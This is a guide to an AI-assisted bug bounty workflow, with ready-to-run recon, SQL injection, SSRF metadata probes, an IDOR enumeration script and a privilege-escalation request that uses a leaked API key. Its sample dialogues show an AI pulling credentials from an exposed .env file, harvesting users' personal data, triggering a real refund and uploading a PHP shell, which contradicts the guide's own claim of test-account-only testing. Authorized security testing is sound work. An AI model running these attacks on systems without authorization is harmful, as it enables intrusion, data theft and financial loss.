# AI-Assisted Bug Bounty Workflow

## Overview
This document defines the daily routine and AI collaboration model for effective bug bounty hunting with GitHub Copilot CLI and MCP (Model Context Protocol) integration.

---

## AI Collaboration Model

### What AI Handles (Automated)
**Reconnaissance & Data Collection:**
- Running subdomain enumeration tools
- HTTP probing and technology detection
- Port scanning and service identification
- Directory/file fuzzing
- JavaScript analysis and endpoint extraction
- Parameter discovery
- Parsing tool outputs into structured formats
- Generating reconnaissance reports

**Automation & Scripting:**
- Writing custom bash scripts for repetitive tasks
- Creating Python parsers for tool outputs
- Generating payloads for specific contexts
- Building automation pipelines
- Creating exploitation PoCs

**Analysis & Documentation:**
- Summarizing reconnaissance findings
- Identifying patterns in discovered data
- Drafting vulnerability reports
- Calculating CVSS scores
- Writing remediation recommendations
- Generating step-by-step reproduction instructions

**Tool Execution (via MCP):**
- Executing commands on Kali Linux VM
- Chaining tools together efficiently
- Managing background processes
- Monitoring scan progress
- Collecting and organizing outputs

### What Human Handles (Creative & Decision-Making)
**Strategic Decisions:**
- Final scope interpretation
- Prioritizing testing areas
- Risk assessment for testing actions
- Deciding when to report vs continue testing
- Choosing between multiple exploitation paths

**Complex Manual Testing:**
- Business logic flaw identification
- Creative chaining of vulnerabilities
- Authentication/authorization bypass techniques
- Advanced exploitation requiring intuition
- Social engineering aspects (if in scope)

**Quality Assurance:**
- Reviewing AI-generated reports before submission
- Validating CVSS scores
- Ensuring reproduction steps are accurate
- Sanitizing sensitive data
- Final report polish and submission

**High-Risk Actions:**
- Approving potentially destructive tests
- Exploiting critical vulnerabilities
- Accessing production data (when necessary and authorized)
- Actions that might trigger alerts
- Any operation that could impact availability

### Communication Protocol
**AI Must Ask Before:**
- Accessing production databases
- Running DoS-capable tools
- Exploiting critical vulnerabilities beyond PoC
- Testing rate limits aggressively
- Actions outside explicit scope
- Anything potentially destructive

**AI Can Proceed Without Asking:**
- Read-only reconnaissance
- Standard vulnerability scanning
- Running safe exploitation tools
- Generating reports and documentation
- Parsing and analyzing existing data
- Creating scripts and automations

---

## Daily Routine

### Morning Routine (9:00 AM - 12:00 PM)

#### 1. AI Overnight Scan Review (30 minutes)
**AI Actions (completed overnight):**
```bash
# AI ran these commands overnight
subfinder -d target.com -all -recursive -o subdomains.txt
httpx -l subdomains.txt -status-code -title -tech-detect -o alive.txt
nuclei -l alive.txt -t ~/nuclei-templates/ -severity critical,high,medium -o nuclei-results.txt
katana -u https://target.com -jc -d 3 -o js-files.txt
waybackurls target.com | unfurl keys | sort -u > historical-params.txt
```

**Human Review:**
```
AI: "Good morning! Overnight scans completed. Here's the summary:
- 47 new subdomains discovered
- 23 alive HTTP/HTTPS services
- Nuclei found 3 critical, 8 high, 15 medium severity issues
- 234 JavaScript files analyzed, 89 new endpoints extracted
- 156 historical parameters discovered

Priority findings:
1. [CRITICAL] Exposed .env file on staging.target.com
2. [CRITICAL] SQL injection in search parameter (Nuclei confirmed)
3. [HIGH] Admin panel with default credentials on old.target.com

Shall I begin validating the critical findings?"
```

**Human Response:**
```
"Yes, start with the exposed .env file. Download and analyze contents. 
Then validate the SQL injection manually. Hold on the admin panel - let me review scope first."
```

#### 2. Priority Validation (1 hour)
**AI validates top findings:**
```bash
# AI executes with MCP
curl -s https://staging.target.com/.env
# If accessible, download and parse

# Validate SQL injection
sqlmap -u "https://target.com/search?q=test" --batch --level=2 --risk=2

# Test admin panel (after human approval)
curl -u "admin:admin" https://old.target.com/admin
```

**AI provides structured report:**
```
Finding 1: Exposed .env File
Status: CONFIRMED
Severity: CRITICAL
Contains: Database credentials, API keys, JWT secret
Next steps: Document as F001, prepare report

Finding 2: SQL Injection  
Status: CONFIRMED (Union-based, Time-based blind)
Database: MySQL 5.7.33
Impact: Full database access possible
Next steps: Document as F002, prepare report

Finding 3: Admin Panel
Status: SCOPE CHECK NEEDED (old.target.com marked out-of-scope in program rules)
Recommendation: Skip this finding
```

#### 3. Quick Wins Hunting (1.5 hours)
**Human focuses on quick vulnerabilities while AI supports:**

**Human:** "Let's test IDOR on the API endpoints discovered yesterday."

**AI generates test cases:**
```bash
# AI creates automated IDOR testing script
cat > test-idor.sh << 'EOF'
#!/bin/bash
# Test IDOR on /api/v1/users/{id}

# Login as user1
TOKEN1=$(curl -s -X POST https://target.com/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test1@test.com","password":"TestPass123"}' | jq -r '.token')

# Try accessing user2's data with user1's token
for id in {1..100}; do
  RESPONSE=$(curl -s -H "Authorization: Bearer $TOKEN1" \
    https://target.com/api/v1/users/$id)
  
  if echo "$RESPONSE" | jq -e '.email' > /dev/null 2>&1; then
    EMAIL=$(echo "$RESPONSE" | jq -r '.email')
    echo "[IDOR] User ID $id accessible: $EMAIL"
  fi
done
EOF

chmod +x test-idor.sh
./test-idor.sh
```

**AI reports:**
```
IDOR Vulnerability Confirmed!
- User 1 can access profiles of users 2-87
- Exposed data: email, full name, phone number, address
- All HTTP methods tested: GET (vulnerable), PUT (vulnerable), DELETE (403)
- Impact: Horizontal privilege escalation, PII exposure
- Severity: HIGH

Shall I document this as F003 and prepare the full report?
```

---

### Afternoon Session (1:00 PM - 5:00 PM)

#### 4. Deep Manual Testing (3 hours)
**Human-led with AI support**

**Human:** "Let's test the payment flow for business logic flaws."

**AI assists:**
```bash
# AI sets up testing environment
# Creates multiple test accounts
# Generates test data
# Monitors requests in real-time

# AI suggests test cases:
"Business logic testing checklist for payment flow:
1. Negative amounts: Try amount=-100
2. Zero price: Set price=0.00
3. Integer overflow: Try quantity=2147483647
4. Currency manipulation: Change USD to XXX
5. Race conditions: Submit payment twice simultaneously
6. Workflow bypass: Skip directly to confirmation
7. Coupon stacking: Apply multiple promo codes

I can automate tests 1-4. Would you like to manually test 5-7 
as they require creative manipulation?"
```

**Human:** "Run automated tests 1-4, I'll handle race conditions and workflow bypass."

**AI executes and reports:**
```
Results from automated business logic tests:

Test 1 - Negative Amount: VULNERABLE
POST /api/v1/checkout
{"amount": -100, "currency": "USD"}
Response: {"status": "success", "refund": 100}
→ System issued $100 refund instead of charging!

Test 2 - Zero Price: BLOCKED
Validation error: "Amount must be greater than 0"

Test 3 - Integer Overflow: VULNERABLE  
quantity=2147483647 → Caused 500 error, potential DoS

Test 4 - Currency Manipulation: NOT VULNERABLE
Server validates currency against allowed list

Confirmed vulnerabilities:
- F004: Negative amount causes refund (CRITICAL)
- F005: Integer overflow DoS (MEDIUM)

Documenting findings now...
```

#### 5. Advanced Exploitation (1 hour)
**Chaining vulnerabilities together**

**Human:** "Can we chain the IDOR with the exposed API key to elevate privileges?"

**AI analyzes and tests:**
```bash
# AI builds exploitation chain
# Step 1: Use exposed API key from .env
# Step 2: Query internal admin API
# Step 3: Use IDOR to access admin user data
# Step 4: Modify own user to admin via PUT request

curl -X PUT https://target.com/api/v1/users/5 \
  -H "Authorization: Bearer $EXPOSED_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin", "permissions": ["all"]}'
```

**AI reports:**
```
Exploitation Chain Successful!

Chain: Exposed API Key → IDOR → Privilege Escalation
Steps:
1. Retrieved admin API key from exposed .env file
2. Used IDOR to identify admin user ID (id=1)
3. Modified own account (id=5) to admin role via PUT
4. Confirmed admin access to /admin panel

Impact: Complete application takeover
Severity: CRITICAL (chained attack)

This is a high-impact finding. Shall I:
1. Document as separate finding (F006)?
2. Update findings F001-F003 to reference this chain?
3. Prepare comprehensive report with full chain?
```

---

### Evening Session (5:00 PM - 7:00 PM)

#### 6. Documentation & Reporting (1.5 hours)
**AI drafts, Human reviews**

**AI generates reports:**
```markdown
Finding F001: Exposed Environment Configuration File

Title: [CRITICAL] Exposed .env File Containing Database Credentials and API Keys

Summary:
The staging environment (staging.target.com) exposes the .env configuration file 
at https://staging.target.com/.env, revealing database credentials, third-party 
API keys, JWT secret, and AWS access keys. This allows complete compromise of 
the application infrastructure.

[... AI generates complete report with all sections ...]

CVSS v3.1 Score: 9.8 (Critical)
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

[... Full technical details, PoC, remediation ...]
```

**Human reviews:**
- Checks accuracy of technical details
- Validates CVSS score
- Ensures reproduction steps work
- Sanitizes any sensitive data
- Polishes language and formatting
- Adds any missing context

**Human:** "Report looks good. Minor corrections needed:"
1. Change 'staging environment' to 'development environment' (I checked, it's marked as dev in scope)
2. Add note that production environment is NOT affected
3. Increase impact section - mention regulatory compliance (GDPR)

**AI updates:** "Corrections applied. Updated report ready for submission."

#### 7. Planning Tomorrow's Work (30 minutes)
**Collaborative planning**

**AI suggests:**
```
Tomorrow's testing priorities based on today's findings:

High Priority:
1. GraphQL endpoint discovered (/graphql) - test introspection, batching, nested queries
2. File upload functionality - test for RCE, path traversal, XXE
3. JWT implementation - found in JavaScript, test for weak secrets and manipulation
4. OAuth flow - map complete flow, test for redirect_uri bypass

Medium Priority:
5. Continue API testing - more endpoints discovered
6. XSS testing - found multiple input fields
7. CSRF testing on state-changing functions

Recommended overnight scans:
- Deep directory fuzzing with larger wordlist
- SSL/TLS comprehensive testing with testssl.sh
- CMS-specific scans (WordPress detected on blog subdomain)

Estimated time: 8-10 hours of testing
Expected findings: 5-8 vulnerabilities (mix of severities)

Shall I prepare the automation scripts for tomorrow's testing?
```

**Human:** "Yes, prepare scripts. Focus on GraphQL and JWT testing - those look promising. Set up overnight fuzzing with SecLists raft-large."

---

## Weekly Routine

### Monday: Target Selection & Initial Recon
- Select new bug bounty program or TryHackMe room
- Review scope thoroughly
- AI runs comprehensive reconnaissance
- Set up target workspace with new-target.sh
- Human reviews findings and prioritizes

### Tuesday-Thursday: Active Testing
- Deep vulnerability testing
- Manual exploitation attempts
- Business logic analysis
- Chaining vulnerabilities
- Documentation of findings

### Friday: Reporting & Learning
- Finalize all vulnerability reports
- Submit high-severity findings first
- Review week's performance
- Update methodology based on lessons learned
- Plan next week's targets

### Weekend: Passive Monitoring
- AI runs long-duration scans
- Historical data analysis
- Tool updates and maintenance
- Research new exploitation techniques
- Optional: Low-priority testing

---

## Command Examples for AI (via MCP)

### Reconnaissance Commands
```bash
# Subdomain enumeration
subfinder -d target.com -all -recursive -o subdomains.txt && \
  httpx -l subdomains.txt -status-code -title -tech-detect -o alive.txt && \
  nuclei -l alive.txt -t exposures/ -severity critical,high -o critical-exposures.txt

# JavaScript analysis pipeline
katana -u https://target.com -jc -d 3 -o js-files.txt && \
  cat js-files.txt | while read url; do \
    python3 ~/tools/LinkFinder/linkfinder.py -i "$url" -o cli; \
  done | tee extracted-endpoints.txt

# API discovery
ffuf -u https://target.com/api/FUZZ -w ~/wordlists/api-endpoints.txt \
  -mc 200,201,204,400,401,403,500 -o api-fuzz.json

# Parameter discovery
arjun -u https://target.com/search --stable && \
  waybackurls target.com | unfurl keys | sort -u > all-params.txt
```

### Vulnerability Testing Commands
```bash
# SQL injection testing
sqlmap -u "https://target.com/search?q=test" --batch --level=2 --risk=2 \
  --random-agent --threads=5

# XSS testing
dalfox url https://target.com/search?q=FUZZ --skip-bav --skip-mining-dom

# SSRF testing  
cat urls.txt | while read url; do \
  curl -s "$url?url=http://169.254.169.254/latest/meta-data/" | grep -i "ami-id" && \
    echo "[SSRF] $url is vulnerable"; \
done

# Directory fuzzing
ffuf -u https://target.com/FUZZ -w ~/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt \
  -mc 200,204,301,302,307,401,403 -fc 404 -o dirs.json
```

### Automation Scripts
```bash
# Daily reconnaissance script (AI creates and runs)
cat > daily-recon.sh << 'EOF'
#!/bin/bash
TARGET=$1
DATE=$(date +%Y%m%d)
OUTPUT_DIR="recon/$DATE"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting daily reconnaissance for $TARGET"

# Subdomain discovery
subfinder -d $TARGET -all -o "$OUTPUT_DIR/subdomains-new.txt"

# Compare with previous day
if [ -f "recon/subdomains-all.txt" ]; then
  comm -13 <(sort recon/subdomains-all.txt) <(sort "$OUTPUT_DIR/subdomains-new.txt") > "$OUTPUT_DIR/subdomains-diff.txt"
  echo "[+] New subdomains: $(wc -l < "$OUTPUT_DIR/subdomains-diff.txt")"
fi

# Probe new subdomains
httpx -l "$OUTPUT_DIR/subdomains-diff.txt" -o "$OUTPUT_DIR/alive-new.txt"

# Scan for exposures
nuclei -l "$OUTPUT_DIR/alive-new.txt" -t exposures/ -o "$OUTPUT_DIR/nuclei-new.txt"

# Update master list
cat "$OUTPUT_DIR/subdomains-new.txt" >> recon/subdomains-all.txt
sort -u recon/subdomains-all.txt -o recon/subdomains-all.txt

echo "[+] Daily recon complete. Check $OUTPUT_DIR for results."
EOF

chmod +x daily-recon.sh
```

---

## Communication Templates

### AI Daily Summary Template
```
Daily Testing Summary - [DATE]

🎯 Targets Tested:
- target.com (main application)  
- api.target.com (REST API)
- admin.target.com (admin panel)

🔍 Activities:
- Reconnaissance: 3 hours
- Manual testing: 4 hours  
- Exploitation: 2 hours
- Documentation: 1 hour

✅ New Findings:
- F007: [HIGH] IDOR in User Profile API
- F008: [MEDIUM] XSS in Comment Section
- F009: [LOW] Missing HSTS Header

📊 Statistics:
- Total findings: 9 (2 Critical, 3 High, 2 Medium, 2 Low)
- Findings submitted: 5
- Bounty earned today: $3,000
- Hours invested: 10
- Bounty per hour: $300

🚀 Tomorrow's Plan:
- Test GraphQL endpoint
- Investigate JWT implementation
- Continue IDOR testing on orders API

💡 Insights:
- Pattern identified: All /api/v1/* endpoints lack authorization checks
- Recommendation: Test all API endpoints for IDOR systematically
```

### Request for Human Input Template
```
⚠️ Human Decision Required

Context: Testing file upload functionality on https://target.com/upload

Scenario: Discovered file upload accepts PHP files. Successfully uploaded 
shell.php and it's accessible at https://target.com/uploads/shell.php

Current Status: Have basic PHP shell, could escalate to full system access

Question: How shall I proceed?
Options:
A) Stop here, document PoC, report immediately (recommended)
B) Investigate further but read-only (ls, whoami, uname)
C) Full exploitation to demonstrate impact (requires explicit authorization)

Risk Assessment:
- Current action: LOW risk (uploaded file, no execution yet)
- Option A: ZERO risk
- Option B: LOW risk (read-only commands)
- Option C: HIGH risk (could trigger alerts, affect system)

Recommendation: Option A - We have sufficient PoC for critical severity report.

Awaiting your decision...
```

---

## Notes & Best Practices

### Efficiency Tips
1. **Parallel Processing**: AI runs multiple reconnaissance tools simultaneously
2. **Overnight Scans**: Long-running scans (nuclei, directory fuzzing) run overnight
3. **Automated Pipelines**: Chain tools together (subfinder → httpx → nuclei)
4. **Smart Filtering**: AI filters false positives before human review
5. **Context Preservation**: AI maintains state across session (remembers findings, scope, progress)

### Quality Assurance
- Human always reviews AI-generated reports before submission
- CVSS scores double-checked against official calculator
- Reproduction steps tested by human before submission
- All sensitive data sanitized (API keys, passwords, PII)
- Professional language and grammar checked

### Safety Protocols
- AI never exceeds authorized scope without explicit permission
- High-risk actions always require human approval
- Rate limits always respected (default: 10 req/sec)
- Test accounts used exclusively (no real user data accessed)
- Stop immediately if unintended system behavior observed

### Performance Tracking
- Track time spent per phase
- Monitor findings per hour
- Calculate bounty per hour
- Identify most productive testing areas
- Optimize workflow based on metrics

---

**This workflow maximizes efficiency by leveraging AI for automation, reconnaissance, and documentation while keeping human judgment central to strategy, exploitation, and quality assurance.**
